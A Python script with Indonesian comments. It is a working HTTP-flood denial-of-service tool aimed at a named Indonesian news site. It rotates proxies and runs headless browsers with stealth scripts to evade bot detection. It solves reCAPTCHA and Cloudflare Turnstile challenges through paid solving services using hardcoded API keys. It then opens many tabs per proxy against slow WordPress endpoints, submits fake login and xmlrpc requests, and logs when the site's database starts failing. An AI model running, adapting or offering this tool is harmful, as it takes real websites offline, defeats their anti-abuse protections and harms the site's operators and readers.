# Kill any leftover Chrome/Playwright processes before starting
import os
os.system("pkill -f chrome || true")
os.system("pkill -f chromium || true")
os.system("pkill -f playwright || true")
import asyncio
import httpx
import random
import time
import re
import json
from playwright.async_api import async_playwright
import multiprocessing
import psutil

PROXY_SOURCES = [
    'https://raw.githubusercontent.com/CandraRudi/proxyxnxx/refs/heads/main/xxx.txt'
]

import sys
TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else 'https://indotodaynews.id'

# Move heavy_endpoints definition to top so it can be used for printing below
heavy_endpoints = [
    "/tag/politik/",
    "/tag/ekonomi/",
    "/tag/kriminal/",
    "/tag/pendidikan/",
    "/tag/internasional/",
    "/search?q=demo",
    "/search?q=test",
    "/category/nasional/",
    "/category/internasional/",
    "/category/umum/",
    "/category/pendidikan/",
    "/category/kesehatan/",
    "/category/khas/",
    "/category/ekonomi-bisnis/",
    "/author/redaksi/",
    "/author/eko-saputra/"

]

print(f"Serang : {TARGET_URL}")
print("Target Serang :")
for endpoint in heavy_endpoints:
    print(f"- {TARGET_URL}{endpoint}")
VALID_PROXIES = []

# === 2Captcha API Key configuration ===
CAPTCHA_API_KEY = "0447e3a7df78f410e054a56bdf4ccd85"

# User-Agent list for rotation
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-G990B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
]

# Statistics dictionary
stats = {
    "success": 0,
    "fail": 0,
    "error_5xx": 0,
    "captcha_2captcha": 0,
    "captcha_capmonster": 0,
}

endpoint_stats = {}
semaphore = None

def is_target_up(url):
    try:
        r = httpx.get(url, timeout=5)
        return r.status_code < 500  # anggap target hidup jika tidak error fatal
    except:
        return True  # tetap anggap hidup agar bisa lanjut pakai headless

def is_cloudflare_protected(url):
    try:
        r = httpx.get(url, timeout=5)
        return "cloudflare" in r.headers.get("server", "").lower()
    except:
        return False

# Fungsi deteksi tipe server
def detect_server_type(url):
    try:
        r = httpx.get(url, timeout=5)
        server = r.headers.get("server", "unknown").lower()
        if "litespeed" in server:
            return "LiteSpeed"
        elif "cloudflare" in server:
            return "Cloudflare (reverse proxy)"
        elif "nginx" in server:
            return "Nginx"
        elif "apache" in server:
            return "Apache"
        elif "openresty" in server:
            return "OpenResty"
        elif server != "unknown":
            return f"Other: {server}"
        else:
            return "Unknown"
    except:
        return "Unknown"

# Scan heavy paths function
def scan_heavy_paths(base_url):
    import httpx
    from datetime import datetime

    candidate_paths = [
        "/", "/wp-json/wp/v2/posts", "/?s=test", "/wp-login.php", "/xmlrpc.php",
        "/category/nasional/", "/search/test", "/author/1/", "/tag/news",
        "/wp-admin/admin-ajax.php?action=heartbeat"
    ]

    print("🔍 Memulai scan path berat...")
    heavy_paths = []
    try:
        with httpx.Client(timeout=10) as client:
            for path in candidate_paths:
                url = base_url.rstrip("/") + path
                try:
                    r = client.get(url)
                    size = len(r.text)
                    elapsed = r.elapsed.total_seconds()
                    print(f"🔎 {path:<40} Status: {r.status_code} | Size: {size} | Time: {elapsed}s")
                    if r.status_code == 200 and (size > 10000 or elapsed > 1.5):
                        heavy_paths.append(path)
                except Exception as e:
                    print(f"⚠️  {path:<40} ERROR: {e}")
    except Exception as e:
        print(f"❌ Gagal saat scan heavy path: {e}")
        return []

    # Simpan ke file
    if heavy_paths:
        with open("heavy_paths.txt", "w") as f:
            for p in heavy_paths:
                f.write(p + "\n")
        print(f"✅ Heavy path ditemukan: {len(heavy_paths)} → Simpan ke heavy_paths.txt")
    else:
        print("⚠️  Tidak ditemukan path berat.")
    return heavy_paths

# === Tambahkan fungsi crawl_and_score_paths setelah scan_heavy_paths ===
def crawl_and_score_paths(base_url):
    import httpx
    from urllib.parse import urljoin, urlparse
    import re

    print("🕷️  Mulai crawl halaman utama untuk cari endpoint...")

    visited = set()
    scored_paths = []

    try:
        with httpx.Client(timeout=10, follow_redirects=True) as client:
            resp = client.get(base_url)
            if resp.status_code != 200:
                print("⚠️  Gagal ambil halaman utama.")
                return []

            html = resp.text
            raw_links = re.findall(r'href=["\\\'](.*?)["\\\']', html)
            filtered_links = [urljoin(base_url, link) for link in raw_links if link.startswith("/") or base_url in link]

            for link in filtered_links:
                parsed = urlparse(link)
                path = parsed.path
                if path in visited or not path.startswith("/"):
                    continue
                visited.add(path)

                try:
                    r = client.get(urljoin(base_url, path))
                    size = len(r.text)
                    time_ = r.elapsed.total_seconds()
                    score = 0
                    if size > 10000:
                        score += 1
                    if time_ > 1.5:
                        score += 1
                    if r.status_code == 200 and score > 0:
                        scored_paths.append((path, score, size, time_))
                        print(f"📈 {path:<40} Score: {score} | Size: {size} | Time: {time_:.2f}s")
                except Exception as e:
                    print(f"⚠️  Gagal akses {path}: {e}")
    except Exception as e:
        print(f"❌ Gagal saat crawl: {e}")
        return []

    # Urutkan berdasarkan skor dan simpan
    scored_paths.sort(key=lambda x: (-x[1], -x[2]))
    with open("heavy_paths.txt", "w") as f:
        for path, score, _, _ in scored_paths:
            f.write(path + "\n")
    print(f"✅ Total path berat dari crawl: {len(scored_paths)} → Simpan ke heavy_paths.txt")

    return [p[0] for p in scored_paths]



async def scrape_proxies():
    proxies = []
    for url in PROXY_SOURCES:
        try:
            async with httpx.AsyncClient() as client:
                response = await client.get(url, timeout=10)
                proxies.extend([line.strip() for line in response.text.splitlines() if line.strip()])
        except:
            continue
    return proxies

async def validate_proxy(proxy: str) -> bool:
    async with semaphore:
        try:
            ip, port, user, password = proxy.split(":")
            playwright = await async_playwright().start()
            browser = await playwright.chromium.launch(
                proxy={"server": f"http://{ip}:{port}", "username": user, "password": password},
                headless=True
            )
            context = await browser.new_context()
            page = await context.new_page()
            response = await page.goto(TARGET_URL, timeout=15000)
            await browser.close()
            await playwright.stop()
            return response.status == 200
        except Exception as e:
            print(f"\033[90m[DEBUG]\033[0m Proxy {proxy} failed with error: {str(e)}")
            return False


def chunked(iterable, n):
    for i in range(0, len(iterable), n):
        yield iterable[i:i + n]

async def filter_valid_proxies(proxy_list):
    valid = []
    for batch in chunked(proxy_list, 3):  # proses 3 proxy per batch
        tasks = [asyncio.create_task(validate_proxy(proxy)) for proxy in batch]
        results = await asyncio.gather(*tasks)
        valid.extend([proxy for proxy, ok in zip(batch, results) if ok])
        await asyncio.sleep(1)
    return valid


# --- CapMonster Cloud + 2Captcha hybrid reCAPTCHA & Turnstile solver ---
async def solve_captcha(site_key, url, captcha_type="recaptcha"):
    capmonster_api_key = "de092f4981ed7f04d60a9b9867c9bc4f"
    twocaptcha_api_key = CAPTCHA_API_KEY

    task_type = "NoCaptchaTaskProxyless" if captcha_type == "recaptcha" else "TurnstileTaskProxyless"
    print(f"\033[90m[DEBUG]\033[0m Submit task to CapMonster: type={task_type}, key={site_key}, url={url}")

    create_task_payload = {
        "clientKey": capmonster_api_key,
        "task": {
            "type": task_type,
            "websiteURL": url,
            "websiteKey": site_key
        }
    }

    async with httpx.AsyncClient() as client:
        try:
            create_task = await client.post("https://api.capmonster.cloud/createTask", json=create_task_payload)
            task_json = create_task.json()
            if task_json.get("errorCode") == "ERROR_ZERO_BALANCE":
                raise Exception("CapMonster ZERO BALANCE")
            task_id = task_json.get("taskId")
            if not task_id:
                raise Exception(f"CapMonster error: {task_json}")
            for _ in range(30):
                await asyncio.sleep(5)
                result = await client.post("https://api.capmonster.cloud/getTaskResult", json={"clientKey": capmonster_api_key, "taskId": task_id})
                data = result.json()
                print(f"\033[90m[DEBUG]\033[0m Polling captcha status... {data.get('status')}")
                if data.get("status") == "ready":
                    print(f"\033[90m[DEBUG]\033[0m Solved token from CapMonster: {data['solution']['gRecaptchaResponse'][:20]}")
                    stats["captcha_capmonster"] += 1
                    return data["solution"]["gRecaptchaResponse"]
                elif data.get("errorId") != 0:
                    raise Exception(f"CapMonster getTaskResult error: {data.get('errorDescription')}")
        except Exception as e:
            print(f"\033[33m[WARN]\033[0m CapMonster failed, fallback to 2Captcha: {str(e)}")

        if captcha_type == "turnstile":
            raise Exception("Turnstile tidak didukung oleh 2Captcha, skip fallback.")
        
        # === 2Captcha fallback ===
        data = {
            "key": twocaptcha_api_key,
            "method": "userrecaptcha",
            "googlekey": site_key,
            "pageurl": url,
            "json": 1
        }
        resp = await client.post("http://2captcha.com/in.php", data=data)
        result = resp.json()
        if result.get("status") != 1:
            raise Exception(f"2Captcha error: {result.get('request')}")
        captcha_id = result.get("request")
        for _ in range(30):
            await asyncio.sleep(5)
            poll = await client.get("http://2captcha.com/res.php", params={
                "key": twocaptcha_api_key,
                "action": "get",
                "id": captcha_id,
                "json": 1
            })
            poll_result = poll.json()
            print(f"\033[90m[DEBUG]\033[0m Polling captcha status... {poll_result.get('status')}")
            if poll_result.get("status") == 1:
                print(f"\033[90m[DEBUG]\033[0m Solved token from 2Captcha: {poll_result.get('request')[:20]}")
                stats["captcha_2captcha"] += 1
                return poll_result.get("request")
            elif poll_result.get("request") != "CAPCHA_NOT_READY":
                raise Exception(f"2Captcha error: {poll_result.get('request')}")
        raise Exception("2Captcha solve timed out")

async def attack_with_playwright(proxy: str):
    global stats
    global tab_count
    try:
        ip, port, user, password = proxy.split(":")
        user_agent = random.choice(USER_AGENTS)
        playwright = await async_playwright().start()
        browser = await playwright.chromium.launch(
            proxy={"server": f"http://{ip}:{port}", "username": user, "password": password},
            headless=True,
            args=[
                "--disable-blink-features=AutomationControlled",
                "--no-sandbox",
                "--disable-web-security",
                "--disable-setuid-sandbox",
                "--disable-dev-shm-usage",
                "--ignore-certificate-errors",
                "--disable-features=IsolateOrigins,site-per-process"
            ]
        )
        context = await browser.new_context(
            user_agent=user_agent,
            locale="en-US",
            timezone_id="America/New_York",
            viewport={"width": 1366, "height": 768}
        )
        # === Tambahan skrip stealth anti-bot ===
        await context.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => false})")
        await context.add_init_script("window.chrome = { runtime: {} }")
        await context.add_init_script("Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']})")
        await context.add_init_script("Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]})")
        await context.add_init_script('''navigator.permissions.query = (parameters) => (
            parameters.name === 'notifications'
              ? Promise.resolve({ state: Notification.permission })
              : Promise.reject(new Error("Permission denied"))
        )''')
        # Header anti-bot
        await context.set_extra_http_headers({
            "Accept-Language": "en-US,en;q=0.9",
            "Sec-Ch-Ua": '"Chromium";v="115", "Google Chrome";v="115", "Not:A-Brand";v="99"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"'
        })
        # === STEALTH support: inject stealth.min.js ===
        await context.add_init_script(path="stealth.min.js")
        print("\033[95m[STEALTH]\033[0m Stealth mode activated")
        await context.route("**/*", lambda route, request: route.abort() if request.resource_type in ["image", "stylesheet", "font"] else route.continue_())
        page = await context.new_page()

        response = await page.goto(TARGET_URL, timeout=30000)
        # Tunggu domcontentloaded sebelum brute force
        await page.wait_for_load_state('domcontentloaded')
        await page.keyboard.press("ArrowDown")
        await page.mouse.click(100, 100)
        await page.mouse.move(250, 300)
        await page.mouse.click(250, 300)
        await page.mouse.wheel(0, 500)
        if response is not None and 500 <= response.status < 600:
            stats["error_5xx"] += 1
        await page.wait_for_timeout(3000)

        # --- reCAPTCHA auto-solve integration ---
        content = await page.content()
        if "Checking your browser before accessing" in content or "jschallenge" in content:
            print(f"[⚠️] {proxy}: Detected JS Challenge Page (Anti-Bot / JavaScript Challenge)")
            js_challenge_detected = True
        else:
            js_challenge_detected = False

        # Tambahan logic: Tunggu jika masih di halaman interstitial
        first_title = await page.title()
        if first_title.strip() == "Just a moment...":
            print(f"[⏳] {proxy}: Masih di halaman interstitial, menunggu hingga selesai...")
            try:
                await page.wait_for_function("document.title !== 'Just a moment...'", timeout=90000)
                await page.wait_for_load_state("networkidle", timeout=10000)
                print(f"[✅] {proxy}: Interstitial selesai. Melanjutkan...")
                # Setelah reload, cek ulang apakah benar sudah lewat interstitial
                await page.wait_for_load_state('load')
                new_title = await page.title()
                if new_title.strip() == "Just a moment...":
                    print(f"\033[91m[FAIL]\033[0m Accessed with {proxy} => Still on interstitial, not real success.")
                    stats["fail"] += 1
                    await page.screenshot(path=f"screenshot_{proxy.replace(':','_')}.png")
                    await browser.close()
                    await playwright.stop()
                    return
                else:
                    print(f"\033[92m[SUCCESS]\033[0m Accessed with {proxy} => <title>{new_title}</title>")
            except:
                print(f"[SKIP] {proxy}: Terlalu lama stuck di halaman interstitial (Just a moment...)")
        # === PERBAIKAN 1: Tambahkan delay & pengecekan ulang CAPTCHA setelah interstitial ===
        await page.wait_for_timeout(2000)  # Tambahkan waktu delay sebelum evaluasi ulang
        content = await page.content()  # Refresh isi konten
        # Re-query sitekey & turnstile
        try:
            element = await page.query_selector('[data-sitekey]')
            sitekey = await element.get_attribute('data-sitekey') if element else None
        except:
            sitekey = None
        sitekey_found = bool(sitekey and len(sitekey) >= 30)
        try:
            turnstile_input = await page.query_selector('input[name="cf-turnstile-response"]')
            turnstile_widget = await page.query_selector('.cf-turnstile')
            turnstile_sitekey = await turnstile_widget.get_attribute('data-sitekey') if turnstile_widget else None
        except:
            turnstile_input = None
            turnstile_sitekey = None
        print(f"\033[90m[DEBUG]\033[0m Detected sitekey: {sitekey}, Turnstile sitekey: {turnstile_sitekey}")

        # Prioritaskan Turnstile jika keduanya muncul, karena Cloudflare override reCAPTCHA
        if turnstile_input and turnstile_sitekey:
            # solve Turnstile...
            print(f"\033[94m[INFO]\033[0m {proxy}: Detected Turnstile sitekey → Solving with CapMonster...")
            try:
                token = await solve_captcha(turnstile_sitekey, TARGET_URL, captcha_type="turnstile")
                # PERBAIKAN 2: Validasi token tidak kosong
                if not token:
                    raise Exception("Token CAPTCHA kosong. Gagal solve.")
                print(f"\033[95m[INJECT]\033[0m Injecting Turnstile token: {token[:20]}")
                await page.evaluate("""
                  const el = document.querySelector('input[name="cf-turnstile-response"]');
                  if (el) { el.value = "%s"; }
                """ % token)
                # Evaluate input before reload
                await page.wait_for_timeout(2000)
                await page.evaluate("document.querySelector('form')?.submit();")
                await page.wait_for_timeout(3000)
                await page.evaluate("location.reload()")
                # === Tambahan verifikasi setelah reload ===
                await page.wait_for_load_state('load')
                print(f"\033[95m[AFTER CAPTCHA]\033[0m Page title after reload: {await page.title()}")
                # Verifikasi token benar-benar digunakan
                final_token_value = await page.evaluate("document.querySelector('[name*=captcha]')?.value")
                print(f"\033[95m[VERIFY]\033[0m CAPTCHA token di halaman setelah reload: {final_token_value[:30] if final_token_value else 'None'}")
                # Verifikasi cookie Cloudflare
                cookies = await context.cookies()
                cookie_names = [c['name'] for c in cookies]
                print(f"\033[95m[COOKIE]\033[0m Cookies aktif setelah reload: {cookie_names}")
                # Simpan cf_clearance jika ada
                clearance_cookie = next((c for c in cookies if c['name'] == 'cf_clearance'), None)
                if clearance_cookie:
                    print(f"\033[92m[COOKIE]\033[0m cf_clearance: {clearance_cookie['value']}")
                new_title = await page.title()
                print(f"\033[95m[AFTER TURNSTILE]\033[0m Title Reloaded: {new_title}")
            except Exception as e:
                print(f"\033[33m[WARN]\033[0m Turnstile solve skipped due to error: {e}")
        elif sitekey and not turnstile_sitekey:
            # solve reCAPTCHA...
            if sitekey and len(sitekey) >= 30:
                print(f"\033[94m[INFO]\033[0m {proxy}: Detected reCAPTCHA sitekey → Solving with CapMonster...")
                try:
                    token = await solve_captcha(sitekey, TARGET_URL, captcha_type="recaptcha")
                    # PERBAIKAN 2: Validasi token tidak kosong
                    if not token:
                        raise Exception("Token CAPTCHA kosong. Gagal solve.")
                    print(f"\033[90m[DEBUG]\033[0m Injecting reCAPTCHA token: {token}")
                    # Stronger patch: inject value, submit, reload, and check page
                    await page.evaluate("""
                        const el = document.querySelector('textarea[name="g-recaptcha-response"]');
                        if (el) { el.value = "%s"; }
                    """ % token)
                    await page.evaluate("""
                        const form = document.querySelector('form');
                        if (form) { form.submit(); }
                    """)
                    await page.wait_for_timeout(3000)
                    await page.evaluate("location.reload()")
                    # === Tambahan verifikasi setelah reload ===
                    await page.wait_for_load_state('load')
                    print(f"\033[95m[AFTER CAPTCHA]\033[0m Page title after reload: {await page.title()}")
                    # Verifikasi token benar-benar digunakan
                    final_token_value = await page.evaluate("document.querySelector('[name*=captcha]')?.value")
                    print(f"\033[95m[VERIFY]\033[0m CAPTCHA token di halaman setelah reload: {final_token_value[:30] if final_token_value else 'None'}")
                    # Verifikasi cookie Cloudflare
                    cookies = await context.cookies()
                    cookie_names = [c['name'] for c in cookies]
                    print(f"\033[95m[COOKIE]\033[0m Cookies aktif setelah reload: {cookie_names}")
                    # Simpan cf_clearance jika ada
                    clearance_cookie = next((c for c in cookies if c['name'] == 'cf_clearance'), None)
                    if clearance_cookie:
                        print(f"\033[92m[COOKIE]\033[0m cf_clearance: {clearance_cookie['value']}")
                    new_title = await page.title()
                    print(f"\033[95m[AFTER reCAPTCHA]\033[0m Title Reloaded: {new_title}")
                    # Log to check if we are still on interstitial or have moved to content
                    if new_title.strip() == "Just a moment...":
                        print(f"\033[90m[CHECK]\033[0m After reCAPTCHA reload, still on interstitial ('Just a moment...').")
                        await page.screenshot(path=f"screenshot_{proxy.replace(':','_')}.png")
                    else:
                        print(f"\033[90m[CHECK]\033[0m After reCAPTCHA reload, page moved to content (Title: '{new_title}').")
                except Exception as e:
                    print(f"\033[33m[WARN]\033[0m reCAPTCHA solve skipped due to error: {e}")
            else:
                print(f"\033[94m[INFO]\033[0m {proxy}: Tidak ada CAPTCHA valid terdeteksi, lanjut brute force...")
        else:
            # lanjut brute...
            print(f"\033[94m[INFO]\033[0m {proxy}: Tidak ada CAPTCHA valid terdeteksi, lanjut brute force...")

        # Buka 15 tab tambahan ke halaman berat untuk memaksimalkan beban server
        import os
        if os.path.exists("heavy_paths.txt"):
            with open("heavy_paths.txt", "r") as f:
                overload_endpoints = [line.strip() for line in f if line.strip()]
            print(f"📂 Menggunakan heavy_paths.txt untuk target overload ({len(overload_endpoints)} endpoint).")
        else:
            overload_endpoints = [
                "/wp-login.php",
                "/?s=a",
                "/?s=kontol",
                "/wp-json/wp/v2/posts",
                "/wp-admin/admin-ajax.php?action=heartbeat",
                "/category/nasional/",
                "/xmlrpc.php",
                "/wp-admin/admin-ajax.php?action=load-some-heavy-request"
            ]
            print(f"📂 Menggunakan default overload endpoints ({len(overload_endpoints)}).")
        for _ in range(tab_count):
            tab = await context.new_page()
            try:
                endpoint = random.choice(overload_endpoints)
                print(f"\033[95m[BRUTE]\033[0m Attacking endpoint: {endpoint}")
                start_time = time.time()
                response = await tab.goto(f"https://indotodaynews.id{endpoint}", timeout=20000)
                elapsed = round(time.time() - start_time, 2)
                tab_title = await tab.title()
                if response and response.status == 200:
                    print(f"\033[92m[BRUTE-SUCCESS]\033[0m {endpoint} (Load: {elapsed}s, Title: {tab_title})")
                    global endpoint_stats
                    endpoint_stats[endpoint] = endpoint_stats.get(endpoint, 0) + 1
                else:
                    print(f"\033[91m[BRUTE-FAIL]\033[0m {endpoint} - status: {response.status if response else 'No response'} (Load: {elapsed}s)")
                # Kirim POST login palsu jika endpoint adalah /wp-login.php
                if "/wp-login.php" in endpoint:
                    await tab.fill('input[name="log"]', "fakeuser")
                    await tab.fill('input[name="pwd"]', "fakepass")
                    await tab.fill('input[name="redirect_to"]', "https://indotodaynews.id/wp-login.php")
                    await tab.evaluate("""document.querySelector('input[name="testcookie"]').value = "1";""")
                    await tab.click('input[name="wp-submit"]')
                    await tab.wait_for_timeout(random.uniform(500, 1000))  # Delay acak 0.5-1 detik
                # Kirim brute POST palsu ke /xmlrpc.php jika endpoint tersebut diserang
                if "/xmlrpc.php" in endpoint:
                    await tab.set_content('''
                        <html><body><form id="f" method="post" action="/xmlrpc.php">
                        <input name="data" value="<?xml version='1.0'?><methodCall><methodName>demo.sayHello</methodName></methodCall>">
                        </form><script>document.getElementById('f').submit();</script></body></html>
                    ''')
                    await tab.wait_for_timeout(random.uniform(1000, 1500))
            except:
                print(f"\033[91m[BRUTE-ERROR]\033[0m Failed to attack {endpoint}")
        page_title = await page.title()
        html = await page.content()

        if page_title.strip() == "Just a moment...":
            print(f"\033[91m[FAIL]\033[0m Accessed with {proxy} => Still on interstitial, not real success.")
            stats["fail"] += 1
            await page.screenshot(path=f"screenshot_{proxy.replace(':','_')}.png")
        else:
            print(f"\033[92m[SUCCESS]\033[0m Accessed with {proxy} => <title>{page_title}</title>")
            if "Galat mengadakan koneksi basis data" in html:
                print("✅ [DB ERROR] Target menunjukkan kegagalan koneksi basis data (mulai tumbang!)")
            if response and response.status == 200:
                with open("valid_proxies.txt", "a") as vf:
                    vf.write(proxy + "\n")
            stats["success"] += 1

        await browser.close()
        await playwright.stop()
    except Exception as e:
        print(f"\033[91m[FAIL]\033[0m {proxy}: {str(e)}")
        stats["fail"] += 1

async def main():
    global semaphore
    global tab_count
    for proc in psutil.process_iter():
        if "chrome" in proc.name().lower():
            try:
                proc.kill()
            except:
                pass
    cpu_count = multiprocessing.cpu_count()
    semaphore = asyncio.Semaphore(min(cpu_count, 4))
    print("📂 Membaca proxy dari file lokal: proxy_new.txt")
    with open("/var/www/html/proxy_new.txt", "r") as f:
        proxies = [line.strip() for line in f if line.strip()]
    print(f"✅ Total proxy dari file: {len(proxies)}")
    # proxies = proxies[:50]  # nonaktifkan limit

    # print("🧪 Validating proxies...")
    # valid_proxies = await filter_valid_proxies(proxies)
    # print(f"🔥 Valid proxies: {len(valid_proxies)}")

    print(f"🧪 Skip proxy validation, gunakan semua ({len(proxies)}) proxy langsung.")
    valid_proxies = proxies
    print(f"🔥 Total proxies digunakan langsung: {len(valid_proxies)}")

    with open("valid_proxies.txt", "w") as f:
        for vp in valid_proxies:
            f.write(vp + "\n")
    print("📁 Proxy aktif disimpan ke valid_proxies.txt")

    print("🩺 Cek status target dan server...")
    if not is_target_up(TARGET_URL):
        print("❌ Target sedang mati. Skip attack.")
        return
    server_type = detect_server_type(TARGET_URL)
    print(f"📡 Server terdeteksi: {server_type}")

    print("🛠️ Analisa endpoint berat sebelum serangan...")
    heavy_paths = scan_heavy_paths(TARGET_URL)
    print("🧠 Auto-crawl endpoint tambahan...")
    crawled_heavy_paths = crawl_and_score_paths(TARGET_URL)

    print("🛡️ Deteksi Cloudflare...")
    if is_cloudflare_protected(TARGET_URL):
        print("✅ Target dilindungi oleh Cloudflare. Menggunakan metode Headless + CAPTCHA.")
    else:
        print("⚠️ Target TIDAK dilindungi Cloudflare. (Masih pakai metode headless karena fitur tetap aktif)")

    if not valid_proxies:
        print("❌ No valid proxies found!")
        return

    print("🔥 Final Overload Mode Activated")
    stats["success"] = 0
    stats["fail"] = 0
    stats["error_5xx"] = 0

    print("🚀 Launching attack round...")

    # === Dynamic setting based on CPU cores ===
    # cpu_count already defined above
    if cpu_count >= 12:
        tab_count = 8
        batch_count = 3
    elif cpu_count >= 8:
        tab_count = 6
        batch_count = 1
    elif cpu_count >= 4:
        tab_count = 4
        batch_count = 1
    else:
        tab_count = 2
        batch_count = 1

    print(f"🧠 Deteksi CPU: {cpu_count} core(s) → Tab per Proxy: {tab_count}, Jumlah Batch: {batch_count}")

    batch_size = min(30, len(valid_proxies))

    # Jika CPU usage di atas 90%, skip serangan untuk mencegah overload
    current_cpu = psutil.cpu_percent(interval=1)
    if current_cpu > 90:
        print(f"⚠️ CPU usage saat ini terlalu tinggi ({current_cpu}%). Skip ronde ini untuk menjaga kestabilan VPS.")
        print("🧹 Membersihkan proses Chrome yang aktif...")
        for proc in psutil.process_iter():
            if "chrome" in proc.name().lower():
                try:
                    proc.kill()
                except:
                    pass
        return

    batches = [random.sample(valid_proxies, batch_size) for _ in range(batch_count)]
    for batch in batches:
        await asyncio.gather(*(attack_with_playwright(proxy) for proxy in batch))
        await asyncio.sleep(10)

    print("\n=== RONDE SELESAI ===")
    print(f"✅ Sukses total: {stats['success']} endpoint")
    print(f"❌ Gagal total: {stats['fail']} endpoint")

    # Tambahkan log endpoint terbanyak diserang jika bisa
    # Misalnya hardcoded karena data endpoint tidak dilog, asumsikan:
    if endpoint_stats:
        most_hit = max(endpoint_stats, key=endpoint_stats.get)
        print(f"🔥 Endpoint paling sering sukses: {most_hit}")
    else:
        print("🔥 Tidak ada endpoint sukses yang bisa dianalisis.")

    print(f"📊 Round stats: Success: {stats['success']}, Fail: {stats['fail']}, HTTP 5xx Errors: {stats['error_5xx']}")
    total_hits = stats["success"]
    if total_hits >= 100:
        level = "TINGGI"
    elif total_hits >= 50:
        level = "MEDIUM"
    else:
        level = "SEDANG"
    print(f"📈 Level Serangan: {level}")

    # Logging serangan ke log_attack.json
    from datetime import datetime

    # Add new stats before log_data
    stats["captcha_jschallenge"] = js_challenge_detected if 'js_challenge_detected' in locals() else False
    stats["captcha_sitekey_found"] = sitekey_found if 'sitekey_found' in locals() else False

    log_data = {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "target": TARGET_URL,
        "success": stats['success'],
        "fail": stats['fail'],
        "error_5xx": stats['error_5xx'],
        "captcha_2captcha": stats['captcha_2captcha'],
        "captcha_capmonster": stats['captcha_capmonster'],
        "captcha_jschallenge": stats['captcha_jschallenge'],
        "captcha_sitekey_found": stats['captcha_sitekey_found'],
        "level": level,
        "server_type": server_type
    }

    log_path = "/var/www/html/log_attack.json"
    os.makedirs(os.path.dirname(log_path), exist_ok=True)
    if not os.path.exists(log_path):
        with open(log_path, "w") as f:
            json.dump([], f)
    if os.path.exists(log_path):
        with open(log_path, "r") as f:
            logs = json.load(f)
    else:
        logs = []

    logs.insert(0, log_data)  # log terbaru di atas
    logs = logs[:50]  # simpan 50 terakhir
    with open(log_path, "w") as f:
        json.dump(logs, f, indent=2)

if __name__ == '__main__':
    try:
        os.system("pkill -f chrome || true")
        os.system("pkill -f chromium || true")
        os.system("pkill -f playwright || true")
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n⛔ CTRL+C Ditekan! Membersihkan proses...")
        import os
        os.system("pkill -f chrome")
        os.system("pkill -f chromium")
        os.system("pkill -f playwright")
        print("✅ Semua proses Chrome/Playwright dihentikan.")
